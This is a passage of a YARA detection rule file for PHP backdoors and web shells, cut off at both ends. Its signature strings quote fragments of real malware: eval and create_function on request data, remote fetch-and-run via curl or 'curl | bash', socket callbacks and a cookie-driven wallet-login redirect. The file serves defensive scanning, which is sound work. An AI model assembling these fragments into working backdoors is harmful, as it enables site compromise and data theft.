        $php_backdoor_create_function_025_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*Array\([\s]*'.'[\s]*=>[\s]*'.',[\s]*[^\)]+\);[\s]*\$[\w]+[\s]*=[\s]*[\w]+\(\$[\w]+,[\s]*\$[\w]+\);[\s]*\$[\w]+[\s]*=[\s]*[^;]+chr\([\d]+[+-][\d]+\)[^;]+;[\s]*\$[\w]+\('',[^;]+\);/
    condition:
        $trigger and $php_backdoor_create_function_025_r0
}

// MANUAL FIX NECESSARY
private rule PR01492 : trigger
{
    strings:
        $ps0 = "(\"?>\""
    condition:
        $ps0
}

private rule PR01493 : trigger
{
    strings:
        $ps0 = "$GLOBALS["
    condition:
        $ps0
}

rule php_backdoor_create_function_027 : backdoor
{
    strings:
        $trigger = ")));');"
        $php_backdoor_create_function_027_r0 = /\$GLOBALS\['[\w]+'\][\s]*=[\s]*.[\w]{20,}.;[^\)]+\(\"\?>\"\.gz[^\;]+\(.?\$x\)\)\);/
    condition:
        $trigger and PR01492 and PR01493 and $php_backdoor_create_function_027_r0
}

private rule PR01494 : trigger
{
    strings:
        $ps0 = "}.$"
    condition:
        $ps0
}

rule php_backdoor_create_function_028 : backdoor
{
    strings:
        $trigger = "//scp-"
    condition:
        $trigger and PR01494 and PR00719
}

rule php_backdoor_create_function_029 : backdoor
{
    strings:
        $trigger = "a0vGLOOW4GzDlnPv3QAwOGYchSq7uqvnMuSLo4k"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_backdoor_create_function_031 : backdoor
{
    strings:
        $trigger = "$set_attr('', @$get_attr($img_size($wpsize)));"
    condition:
        $trigger and PR00091
}

// MANUAL FIX NECESSARY
private rule PR01495 : trigger
{
    strings:
        $ps0 = "=\"\\\\x"
    condition:
        $ps0
}

rule php_backdoor_create_function_032 : backdoor
{
    strings:
        $trigger = "\\x7"
        $php_backdoor_create_function_032_r0 = /\$[\w]+[\s]*=[\s]*\"[^;]+\\1[\d]{2}[^;]+\";[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\('\$[\w]+,[\s]*\$[\w]+',[\s]*'\$[\w]+[\s]*=[\s]*\"[^\"]+\\\\1[\d]{2}[^;]+\";[^\n]+\$[\w]+\(\);[\s]*\}/
    condition:
        $trigger and PR01495 and $php_backdoor_create_function_032_r0
}

rule php_backdoor_create_function_033 : backdoor
{
    strings:
        $trigger = "$x',\"\\x65\\x76\\x61\\x6c\\x28\\x22"
    condition:
        $trigger
}

private rule PR01496 : trigger
{
    strings:
        $ps0 = "x5f\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e"
    condition:
        $ps0
}

private rule PR01497 : trigger
{
    strings:
        $ps0 = "\\x4f\\x4b\\x49\\x45"
    condition:
        $ps0
}

private rule PR01498 : trigger
{
    strings:
        $ps0 = "array("
    condition:
        $ps0
}

private rule PR01499 : trigger
{
    strings:
        $ps0 = "=>@$"
    condition:
        $ps0
}

rule php_backdoor_create_function_034 : backdoor
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR01496 and PR01497 and PR01498 and PR01499
}

rule php_backdoor_create_function_035 : backdoor
{
    strings:
        $trigger = "e\\x78\\x74\\x72\\x61\\x63\\x74"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_create_function_036 : backdoor
{
    strings:
        $trigger = "$elementName(\"\\x6f\\x6e\\x66\\x72\\x36\\x34\\x5f\\x71\\x72\\x70\\x62\\x71\\x72\");"
        $php_backdoor_create_function_036_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01396 and $php_backdoor_create_function_036_r0
}

// MANUAL FIX NECESSARY
private rule PR01500 : trigger
{
    strings:
        $ps0 = "')}[chr("
    condition:
        $ps0
}

rule php_backdoor_create_function_038 : backdoor
{
    strings:
        $trigger = ".chr"
        $php_backdoor_create_function_038_r0 = /\$[\w]+[\s]*=[\s]*\@\$\{\$[\w]+\([^)]+\)\}\[chr\([\d]+\)\.chr\([\d]+\)\];[\s]*if\(!empty\(\$[\w]+\)\)\{/
    condition:
        $trigger and PR01500 and $php_backdoor_create_function_038_r0
}

rule php_backdoor_create_function_039 : backdoor
{
    strings:
        $trigger = "create_function(\"\", base64_decode("
    condition:
        $trigger
}

private rule PR01501 : trigger
{
    strings:
        $ps0 = "MHOvQD/JpEQ069tMCThnEMpiPeuU0Hr"
    condition:
        $ps0
}

rule php_backdoor_create_function_040 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01501
}

private rule PR01502 : trigger
{
    strings:
        $ps0 = "array_merge($_REQUEST, $_COOKIE, $_SERVER);"
    condition:
        $ps0
}

rule php_backdoor_create_function_042 : backdoor
{
    strings:
        $trigger = "= isset($"
    condition:
        $trigger and PR01502
}

private rule PR01503 : trigger
{
    strings:
        $ps0 = "\"(edoced_46esab(lave'));"
    condition:
        $ps0
}

private rule PR01504 : trigger
{
    strings:
        $ps0 = "$a',strrev(';)a$(lave'));"
    condition:
        $ps0
}

rule php_backdoor_create_function_043 : backdoor
{
    strings:
        $trigger = "7QXa4VmC7ciPs1Gdo9CP"
    condition:
        $trigger and PR01503 and PR01504
}

rule php_backdoor_create_function_044 : backdoor
{
    strings:
        $trigger = "{$status=create_function(\"\",$_SERVER[strtoupper(\"http_\".\""
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR01505 : trigger
{
    strings:
        $ps0 = "//"
    condition:
        $ps0
}

private rule PR01506 : trigger
{
    strings:
        $ps0 = "ord"
    condition:
        $ps0
}

private rule PR01507 : trigger
{
    strings:
        $ps0 = "create_function(null,"
    condition:
        $ps0
}

rule php_backdoor_create_function_045 : backdoor
{
    strings:
        $trigger = "str"
        $php_backdoor_create_function_045_r0 = /preg_split\(.\/\/.,[^,]+,[\s]*-1,[\s]*1\)[^\?]+create_function\(null,[\s]*\$[\w]+\);[\s]*\$[\w]+\(\);[\s]*\}/
    condition:
        $trigger and PR01505 and PR01506 and PR01507 and $php_backdoor_create_function_045_r0
}

// MANUAL FIX NECESSARY
private rule PR01508 : trigger
{
    strings:
        $ps0 = "(md5(@$_POST["
    condition:
        $ps0
}

rule php_backdoor_create_function_046 : backdoor
{
    strings:
        $trigger = "().PHP_EOL;fi"
        $php_backdoor_create_function_046_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01508 and PR01396 and $php_backdoor_create_function_046_r0
}

rule php_backdoor_create_function_047 : backdoor
{
    strings:
        $trigger = "create_function(\"\",$_POST[\""
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_create_function_050 : backdoor
{
    strings:
        $trigger = "str_replace"
        $php_backdoor_create_function_050_r0 = /\(['\"][\w]+['\"],[\s]*['\"]['\"][\s]*,[\s]*['\"][\w]{0,8}c[\w]{0,8}r[\w]{0,8}e[\w]{0,8}a[\w]{0,8}t[\w]{0,8}e[\w]{0,8}_[\w]{0,8}f[\w]{0,8}u[\w]{0,8}n[\w]{0,8}c[\w]{0,8}t[\w]{0,8}i[\w]{0,8}o[\w]{0,8}n[\w]{0,8}['\"]\);/
    condition:
        $trigger and $php_backdoor_create_function_050_r0
}

private rule PR01509 : trigger
{
    strings:
        $ps0 = "\"](\\'http://\\'.$"
    condition:
        $ps0
}

rule php_backdoor_create_function_051 : backdoor
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR01494 and PR01509
}

private rule PR01510 : trigger
{
    strings:
        $ps0 = "if(crc32($"
    condition:
        $ps0
}

rule php_backdoor_create_function_wp_001 : backdoor
{
    strings:
        $trigger = "=@gzinflate(strrev($"
    condition:
        $trigger and PR01483 and PR01510
}

private rule PR01511 : trigger
{
    strings:
        $ps0 = "value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>"
    condition:
        $ps0
}

rule php_backdoor_crypto_function_001 : backdoor
{
    strings:
        $trigger = "']:(isset($_COOKIE['wp_"
    condition:
        $trigger and PR01483 and PR01511
}

private rule PR01512 : trigger
{
    strings:
        $ps0 = "=@gzinflate("
    condition:
        $ps0
}

rule php_backdoor_crypto_function_002 : backdoor
{
    strings:
        $trigger = "]:(isset($_COOKIE["
    condition:
        $trigger and PR01483 and PR01511 and PR01512
}

private rule PR01513 : trigger
{
    strings:
        $ps0 = "$domain.\"/wallet/#login\");"
    condition:
        $ps0
}

private rule PR01514 : trigger
{
    strings:
        $ps0 = "setcookie"
    condition:
        $ps0
}

rule php_backdoor_crypto_redirect_001 : backdoor
{
    strings:
        $trigger = "$domain = $_COOKIE["
    condition:
        $trigger and PR01513 and PR01514 and PR00273
}

private rule PR01515 : trigger
{
    strings:
        $ps0 = "$social_filename = __DIR__ .'/social.png';"
    condition:
        $ps0
}

rule php_backdoor_cryptoPHP_001 : backdoor
{
    strings:
        $trigger = "_option"
    condition:
        $trigger and PR01515
}

private rule PR01516 : trigger
{
    strings:
        $ps0 = "This code use for global bot statistic"
    condition:
        $ps0
}

private rule PR01517 : trigger
{
    strings:
        $ps0 = "if (!isset($sRetry))"
    condition:
        $ps0
}

rule php_backdoor_curl_001 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01516 and PR01517
}

private rule PR01518 : trigger
{
    strings:
        $ps0 = "if ( $stCurlHandle !== NULL )"
    condition:
        $ps0
}

rule php_backdoor_curl_001_02 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01518 and PR01516
}

private rule PR01519 : trigger
{
    strings:
        $ps0 = "echo file_get_contents('http"
    condition:
        $ps0
}

rule php_backdoor_curl_001_03 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01519 and PR01516
}

private rule PR01520 : trigger
{
    strings:
        $ps0 = "/*This code use for global bot statistic*/"
    condition:
        $ps0
}

rule php_backdoor_curl_001_04 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01520
}

rule php_backdoor_curl_006 : backdoor
{
    strings:
        $trigger = "CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.2) Gecko/2008091620 Firefox/3.0.2'"
    condition:
        $trigger
}

private rule PR01521 : trigger
{
    strings:
        $ps0 = "$ch = curl_init(\"http://finditinhaubstadt.com"
    condition:
        $ps0
}

private rule PR01522 : trigger
{
    strings:
        $ps0 = "CURLOPT_POST, true);"
    condition:
        $ps0
}

rule php_backdoor_curl_007 : backdoor
{
    strings:
        $trigger = "array('file'=>\"@$uploadfile"
    condition:
        $trigger and PR01521 and PR01522
}

private rule PR01523 : trigger
{
    strings:
        $ps0 = "print \"$postResult\";"
    condition:
        $ps0
}

rule php_backdoor_curl_008 : backdoor
{
    strings:
        $trigger = "CURLOPT_POST, true);"
    condition:
        $trigger and PR01523
}

rule php_backdoor_curl_008_02 : backdoor
{
    strings:
        $trigger = "$hasil"
    condition:
        $trigger and PR01522
}

private rule PR01524 : trigger
{
    strings:
        $ps0 = "base64_decode($_REQUEST"
    condition:
        $ps0
}

rule php_backdoor_curl_009 : backdoor
{
    strings:
        $trigger = "echo $filename.\" write success\";"
    condition:
        $trigger and PR00435 and PR01524
}

private rule PR01525 : trigger
{
    strings:
        $ps0 = ">$cek_shell</a> -> shellmu<br>\";"
    condition:
        $ps0
}

rule php_backdoor_curl_010 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR01525
}

private rule PR01526 : trigger
{
    strings:
        $ps0 = "if (!$result && $url && function_exists('fopen"
    condition:
        $ps0
}

rule php_backdoor_curl_011 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01526
}

rule php_backdoor_curl_012 : backdoor
{
    strings:
        $trigger = "eval(curl_exec($"
    condition:
        $trigger
}

private rule PR01527 : trigger
{
    strings:
        $ps0 = "(isset($_GET["
    condition:
        $ps0
}

rule php_backdoor_curl_012_02 : backdoor
{
    strings:
        $trigger = "eval(curl_exec("
    condition:
        $trigger and PR01527
}

private rule PR01528 : trigger
{
    strings:
        $ps0 = "CURLOPT_URL, $_GET["
    condition:
        $ps0
}

private rule PR01529 : trigger
{
    strings:
        $ps0 = "$_SERVER[\"DOCUMENT_ROOT\"]"
    condition:
        $ps0
}

rule php_backdoor_curl_013 : backdoor
{
    strings:
        $trigger = "Stage($fileStage,"
    condition:
        $trigger and PR00435 and PR01528 and PR01529
}

private rule PR01530 : trigger
{
    strings:
        $ps0 = "($_POST['target'], $_SERVER"
    condition:
        $ps0
}

rule php_backdoor_curl_013_02 : backdoor
{
    strings:
        $trigger = "\"upload\"] == \"go\""
    condition:
        $trigger and PR00435 and PR01528 and PR01530 and PR01529
}

private rule PR01531 : trigger
{
    strings:
        $ps0 = "| bash -sh"
    condition:
        $ps0
}

rule php_backdoor_curl_014 : backdoor
{
    strings:
        $trigger = "$handle = popen(\"curl -s http"
    condition:
        $trigger and PR01531
}

rule php_backdoor_curl_015 : backdoor
{
    strings:
        $trigger = "LnBhc3RlLnNlL3Jhdw=="
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR01532 : trigger
{
    strings:
        $ps0 = ",CURLOPT_URL,\"http:"
    condition:
        $ps0
}

rule php_backdoor_curl_016 : backdoor
{
    strings:
        $trigger = ".paste.se/raw\");"
    condition:
        $trigger and PR01350 and PR01532
}

// MANUAL FIX NECESSARY
rule php_backdoor_curl_017 : backdoor
{
    strings:
        $trigger = "md5($_GET["
        $php_backdoor_curl_017_r0 = /\{[\s]*@http_response_code\(404\);[\s]*exit;[\s]*\}/
    condition:
        $trigger and PR00435 and PR00341 and $php_backdoor_curl_017_r0
}

private rule PR01533 : trigger
{
    strings:
        $ps0 = "add_action('init"
    condition:
        $ps0
}

private rule PR01534 : trigger
{
    strings:
        $ps0 = "stream_get_contents($"
    condition:
        $ps0
}

private rule PR01535 : trigger
{
    strings:
        $ps0 = "md5(rand(0"
    condition:
        $ps0
}

rule php_backdoor_curl_018 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01533 and PR01534 and PR01535
}

// MANUAL FIX NECESSARY
private rule PR01536 : trigger
{
    strings:
        $ps0 = "md5=@$_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_curl_019 : backdoor
{
    strings:
        $trigger = "curl_init("
        $php_backdoor_curl_019_r0 = /\{[\s]*@http_response_code\(404\);[\s]*exit;[\s]*\}/
    condition:
        $trigger and PR00435 and PR01536 and $php_backdoor_curl_019_r0
}

private rule PR01537 : trigger
{
    strings:
        $ps0 = "(~base64_decode("
    condition:
        $ps0
}

rule php_backdoor_curl_020 : backdoor
{
    strings:
        $trigger = "(isset($_GET["
    condition:
        $trigger and PR01537 and PR00029 and PR00265
}

private rule PR01538 : trigger
{
    strings:
        $ps0 = "@array_map('unlink',@glob"
    condition:
        $ps0
}

rule php_backdoor_curl_022 : backdoor
{
    strings:
        $trigger = "if(@$_GET["
    condition:
        $trigger and PR00435 and PR00341 and PR01538
}

private rule PR01539 : trigger
{
    strings:
        $ps0 = "stream_context_create($"
    condition:
        $ps0
}

rule php_backdoor_curl_023 : backdoor
{
    strings:
        $trigger = "touch(\"./$randname.php\", time() - mt_rand("
    condition:
        $trigger and PR00435 and PR01539 and PR00341
}

private rule PR01540 : trigger
{
    strings:
        $ps0 = "JEFQUF9Db2Rlcz0kR0xPQkFM"
    condition:
        $ps0
}

rule php_backdoor_curl_024 : backdoor
{
    strings:
        $trigger = "KGlzc2V0KCRfRU5WW3BhY2soJEdMT0JBTFNb"
    condition:
        $trigger and PR01398 and PR01540
}

private rule PR01541 : trigger
{
    strings:
        $ps0 = "feedmtimeFolder(dirname($"
    condition:
        $ps0
}

rule php_backdoor_curl_026 : backdoor
{
    strings:
        $trigger = "touch($"
    condition:
        $trigger and PR00435 and PR00341 and PR01541
}

private rule PR01542 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST["
    condition:
        $ps0
}

private rule PR01543 : trigger
{
    strings:
        $ps0 = "echo $"
    condition:
        $ps0
}

private rule PR01544 : trigger
{
    strings:
        $ps0 = "file_get_contents($"
    condition:
        $ps0
}

rule php_backdoor_curl_027 : backdoor
{
    strings:
        $trigger = "(function_exists('curl_init'))"
    condition:
        $trigger and PR01542 and PR01468 and PR01543 and PR01544
}

// MANUAL FIX NECESSARY
rule php_backdoor_curl_028 : backdoor
{
    strings:
        $trigger = "cGFzdGUuc2UvcmF3"
        $php_backdoor_curl_028_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_backdoor_curl_028_r0
}

private rule PR01545 : trigger
{
    strings:
        $ps0 = "($i){$a=Array('"
    condition:
        $ps0
}

private rule PR01546 : trigger
{
    strings:
        $ps0 = "NULL;do{curl_multi_exec($"
    condition:
        $ps0
}

rule php_backdoor_curl_029 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01545 and PR01479 and PR01546
}

private rule PR01547 : trigger
{
    strings:
        $ps0 = "YWx5dGljcy5hcGllcy5vcmc"
    condition:
        $ps0
}

private rule PR01548 : trigger
{
    strings:
        $ps0 = "@extension_loaded("
    condition:
        $ps0
}

rule php_backdoor_curl_030 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01547 and PR00355 and PR01392 and PR01548 and PR00357
}

private rule PR01549 : trigger
{
    strings:
        $ps0 = "pZufmY+pl6SNicjOrNWlk6u"
    condition:
        $ps0
}

private rule PR01550 : trigger
{
    strings:
        $ps0 = "eval("
    condition:
        $ps0
}

private rule PR01551 : trigger
{
    strings:
        $ps0 = "decrypt($"
    condition:
        $ps0
}

rule php_backdoor_curl_031 : backdoor
{
    strings:
        $trigger = "chr(ord(substr($"
    condition:
        $trigger and PR00732 and PR01549 and PR01550 and PR01551
}

private rule PR01552 : trigger
{
    strings:
        $ps0 = "FZZHDqTYEkWX01VigCdBf4T3kHgzaeG9"
    condition:
        $ps0
}

rule php_backdoor_curl_032 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR01552 and PR00029
}

private rule PR01553 : trigger
{
    strings:
        $ps0 = "curl_exec($"
    condition:
        $ps0
}

private rule PR01554 : trigger
{
    strings:
        $ps0 = "eval('?>'."
    condition:
        $ps0
}

rule php_backdoor_curl_033 : backdoor
{
    strings:
        $trigger = "curl_init($_GET["
    condition:
        $trigger and PR01553 and PR01401 and PR01554
}

rule php_backdoor_curl_034 : backdoor
{
    strings:
        $trigger = "JHNlcnZlciA9ICRfU0VSVkV"
    condition:
        $trigger and PR01398
}

private rule PR01555 : trigger
{
    strings:
        $ps0 = ").$_GET['p'].'&h='.$_GET['h']);curl_exec($c);curl_close($c); exit;}"
    condition:
        $ps0
}

rule php_backdoor_curl_036 : backdoor
{
    strings:
        $trigger = ",CURLOPT_URL,hex2bin("
    condition:
        $trigger and PR01555
}

private rule PR01556 : trigger
{
    strings:
        $ps0 = "foreach(glob($dir.\"/*\",GLOB_ONLYDIR) as $dir){if(is_writable($dir))return $dir;}return false;}}"
    condition:
        $ps0
}

rule php_backdoor_curl_037 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01556 and PR00357
}

rule php_backdoor_curl_039 : backdoor
{
    strings:
        $trigger = ".txt');"
    condition:
        $trigger and PR01553 and PR01401 and PR01554
}

private rule PR01557 : trigger
{
    strings:
        $ps0 = "(empty($code) or !stristr($code"
    condition:
        $ps0
}

rule php_backdoor_curl_040 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01553 and PR01557 and PR01350
}

private rule PR01558 : trigger
{
    strings:
        $ps0 = "[mt_rand(0, strlen($"
    condition:
        $ps0
}

private rule PR01559 : trigger
{
    strings:
        $ps0 = "add_action('init',"
    condition:
        $ps0
}

rule php_backdoor_curl_041 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01534 and PR01558 and PR01559
}

private rule PR01560 : trigger
{
    strings:
        $ps0 = "base64_encode(json_encode($"
    condition:
        $ps0
}

private rule PR01561 : trigger
{
    strings:
        $ps0 = "(is_callable("
    condition:
        $ps0
}

private rule PR01562 : trigger
{
    strings:
        $ps0 = "isset($_GET["
    condition:
        $ps0
}

private rule PR01563 : trigger
{
    strings:
        $ps0 = "base64_decode(self::$"
    condition:
        $ps0
}

private rule PR01564 : trigger
{
    strings:
        $ps0 = "@header"
    condition:
        $ps0
}

rule php_backdoor_curl_043 : backdoor
{
    strings:
        $trigger = "curl_getinfo("
    condition:
        $trigger and PR01560 and PR01561 and PR01562 and PR01563 and PR01564
}

private rule PR01565 : trigger
{
    strings:
        $ps0 = "CURLOPT_URL,'http"
    condition:
        $ps0
}

private rule PR01566 : trigger
{
    strings:
        $ps0 = ") !== false) && (strpos($"
    condition:
        $ps0
}

rule php_backdoor_curl_046 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01553 and PR01565 and PR01566 and PR01350
}

rule php_backdoor_curl_047 : backdoor
{
    strings:
        $trigger = "<?php ${base64_decode('R0xPQkFMUw==')}[base64_decode("
    condition:
        $trigger and PR01398
}

private rule PR01567 : trigger
{
    strings:
        $ps0 = "Pz48P3BocA0KZjNuY3Q0Mm4gRzV0SVAoKXsNCiAgICA0Zihn"
    condition:
        $ps0
}

rule php_backdoor_curl_048 : backdoor
{
    strings:
        $trigger = "$_F=__FILE__;$_X='Pz48P3BocA0K"
    condition:
        $trigger and PR01567 and PR01479
}

private rule PR01568 : trigger
{
    strings:
        $ps0 = "return urldecode(base64_decode(implode($goodservurl)));"
    condition:
        $ps0
}

private rule PR01569 : trigger
{
    strings:
        $ps0 = "$url)"
    condition:
        $ps0
}

rule php_backdoor_curl_049 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01568 and PR01021 and PR01569 and PR01431
}

private rule PR01570 : trigger
{
    strings:
        $ps0 = "file_put_contents(\"{$theme}/functions"
    condition:
        $ps0
}

rule php_backdoor_curl_050 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR01570 and PR01569 and PR01431
}

private rule PR01571 : trigger
{
    strings:
        $ps0 = "{@chmod($"
    condition:
        $ps0
}

private rule PR01572 : trigger
{
    strings:
        $ps0 = "){socket_write($"
    condition:
        $ps0
}

private rule PR01573 : trigger
{
    strings:
        $ps0 = "$_SERVER[REMOTE_ADDR];}}else{if(getenv(\"HTTP_X_FORWARDED_FOR\")){"
    condition:
        $ps0
}

rule php_backdoor_curl_051 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01571 and PR01468 and PR01572 and PR01573
}

rule php_backdoor_curl_052 : backdoor
{
    strings:
        $trigger = "\"]=base64_decode(\"bnByb2M=\");$GLOBALS[\""
    condition:
        $trigger
}

private rule PR01574 : trigger
{
    strings:
        $ps0 = ", 'checklist');"
    condition:
        $ps0
}

private rule PR01575 : trigger
{
    strings:
        $ps0 = "$content = curl_exec($ch);"
    condition:
        $ps0
}

private rule PR01576 : trigger
{
    strings:
        $ps0 = "$options[CURLOPT_POST] = 1;"
    condition:
        $ps0
}

private rule PR01577 : trigger
{
    strings:
        $ps0 = ", '.directory');"
    condition:
        $ps0
}

private rule PR01578 : trigger
{
    strings:
        $ps0 = "CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],"
    condition:
        $ps0
}

rule php_backdoor_curl_053 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01574 and PR01575 and PR01576 and PR01577 and PR01578
}

private rule PR01579 : trigger
{
    strings:
        $ps0 = ",json_encode($_POST, true));"
    condition:
        $ps0
}

rule php_backdoor_curl_053_02 : backdoor
{
    strings:
        $trigger = ", '.directory');"
    condition:
        $trigger and PR01574 and PR01579 and PR01575 and PR01576
}

private rule PR01580 : trigger
{
    strings:
        $ps0 = "CURLOPT_POSTFIELDS => \"{}\","
    condition:
        $ps0
}

private rule PR01581 : trigger
{
    strings:
        $ps0 = "echo \"cURL Error #:\" . $err;"
    condition:
        $ps0
}

rule php_backdoor_curl_054 : backdoor
{
    strings:
        $trigger = "echo $response;"
    condition:
        $trigger and PR01580 and PR01581
}

private rule PR01582 : trigger
{
    strings:
        $ps0 = "curl_getinfo("
    condition:
        $ps0
}

private rule PR01583 : trigger
{
    strings:
        $ps0 = "urlencode(base64_encode(json_encode($"
    condition:
        $ps0
}

private rule PR01584 : trigger
{
    strings:
        $ps0 = "fsockopen(($"
    condition:
        $ps0
}

rule php_backdoor_curl_055 : backdoor
{
    strings:
        $trigger = "isset($_GET["
    condition:
        $trigger and PR01582 and PR01583 and PR01584
}

rule php_backdoor_curl_056 : backdoor
{
    strings:
        $trigger = "$xss = $httpx + $domain + $param;"
    condition:
        $trigger and PR00507
}

private rule PR01585 : trigger
{
    strings:
        $ps0 = "urldecode("
    condition:
        $ps0
}

private rule PR01586 : trigger
{
    strings:
        $ps0 = ");return gzinflate(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_curl_057 : backdoor
{
    strings:
        $trigger = ");eval($"
    condition:
        $trigger and PR01585 and PR01586
}

private rule PR01587 : trigger
{
    strings:
        $ps0 = "=strtok(rtrim($"
    condition:
        $ps0
}

rule php_backdoor_curl_058 : backdoor
{
    strings:
        $trigger = "])){setcookie("
    condition:
        $trigger and PR01587 and PR00391
}

private rule PR01588 : trigger
{
    strings:
        $ps0 = "base_convert(strrev(substr($"
    condition:
        $ps0
}

private rule PR01589 : trigger
{
    strings:
        $ps0 = ";}}elseif(function_exists('fsockopen')){function"
    condition:
        $ps0
}

rule php_backdoor_curl_059 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01588 and PR00355 and PR01589 and PR00357
}

// MANUAL FIX NECESSARY
private rule PR01590 : trigger
{
    strings:
        $ps0 = "<strlen($"
    condition:
        $ps0
}

rule php_backdoor_curl_060 : backdoor
{
    strings:
        $trigger = "(base64_decode("
        $php_backdoor_curl_060_r0 = /function[\s]*[\w]+\(\$[\w]+,[\s]*\$[\w]+\)\{[\s]*\$[\w]+=.[\w]*.;[\s]*for\(\$[\w]+=[\d]+;\$[\w]+<strlen\(\$[\w]+\);\)[\s]*for\(\$[\w]+=[\d]+;\$[\w]+<strlen\(\$[\w]+\);[^;]+;[\s]*return[\s]*\$[\w]+;[\s]*\};[\s]*\$[\w]+=.[\w]+.;[\s]*\$[\w]+=.[\w]+.;[\s]*eval\([\w]+\(base64_decode\(/
    condition:
        $trigger and PR01550 and PR01590 and $php_backdoor_curl_060_r0
}

private rule PR01591 : trigger
{
    strings:
        $ps0 = ")){function getallheaders(){$headers=array();foreach($_SERVER"
    condition:
        $ps0
}

rule php_backdoor_curl_062 : backdoor
{
    strings:
        $trigger = "http_build_query($"
    condition:
        $trigger and PR01553 and PR01401 and PR01591
}

private rule PR01592 : trigger
{
    strings:
        $ps0 = ".urlencode($_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_curl_063 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR01592 and PR01569 and PR01431
}

private rule PR01593 : trigger
{
    strings:
        $ps0 = "parse_str(file_get_contents(\"php://input"
    condition:
        $ps0
}

rule php_backdoor_curl_064 : backdoor
{
    strings:
        $trigger = "eval($"
    condition:
        $trigger and PR01553 and PR01593
}

private rule PR01594 : trigger
{
    strings:
        $ps0 = "aWxlX2dldF9jb250ZW50cygkd"
    condition:
        $ps0
}

rule php_backdoor_curl_065 : backdoor
{
    strings:
        $trigger = "eval(base64_decode('ZnVuY3Rpb2"
    condition:
        $trigger and PR01594
}

private rule PR01595 : trigger
{
    strings:
        $ps0 = "eval ('?>"
    condition:
        $ps0
}

private rule PR01596 : trigger
{
    strings:
        $ps0 = "CURLOPT_COOKIEJAR, $GLOBALS["
    condition:
        $ps0
}

rule php_backdoor_curl_067 : backdoor
{
    strings:
        $trigger = "stream_get_contents("
    condition:
        $trigger and PR01595 and PR01596 and PR00357 and PR01431
}

private rule PR01597 : trigger
{
    strings:
        $ps0 = "stringEncrypt($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_curl_068 : backdoor
{
    strings:
        $trigger = "return $"
    condition:
        $trigger and PR01021 and PR01597 and PR01569 and PR01431
}

private rule PR01598 : trigger
{
    strings:
        $ps0 = "curl_exec($ch);curl_close($ch);eval($"
    condition:
        $ps0
}

private rule PR01599 : trigger
{
    strings:
        $ps0 = "$timeout"
    condition:
        $ps0
}

rule php_backdoor_curl_069 : backdoor
{
    strings:
        $trigger = "CURLOPT_URL, base64_decode('aHR0"
    condition:
        $trigger and PR01598 and PR01599
}

private rule PR01600 : trigger
{
    strings:
        $ps0 = "]) == true && isset($_SERVER["
    condition:
        $ps0
}

private rule PR01601 : trigger
{
    strings:
        $ps0 = "curl_setopt"
    condition:
        $ps0
}

rule php_backdoor_curl_070 : backdoor
{
    strings:
        $trigger = "strtolower($_SERVER['HTTP_USER_AGENT']);"
    condition:
        $trigger and PR01600 and PR01553 and PR01401 and PR01601
}

private rule PR01602 : trigger
{
    strings:
        $ps0 = "];}exit;}elseif(preg_match(\"/images\\//\",$"
    condition:
        $ps0
}

private rule PR01603 : trigger
{
    strings:
        $ps0 = "]):print $"
    condition:
        $ps0
}

rule php_backdoor_curl_071 : backdoor
{
    strings:
        $trigger = "]);echo"
    condition:
        $trigger and PR00435 and PR01602 and PR00341 and PR01603
}

private rule PR01604 : trigger
{
    strings:
        $ps0 = "|| stripos($agent,"
    condition:
        $ps0
}

private rule PR01605 : trigger
{
    strings:
        $ps0 = "].@$_SERVER["
    condition:
        $ps0
}

rule php_backdoor_curl_072 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
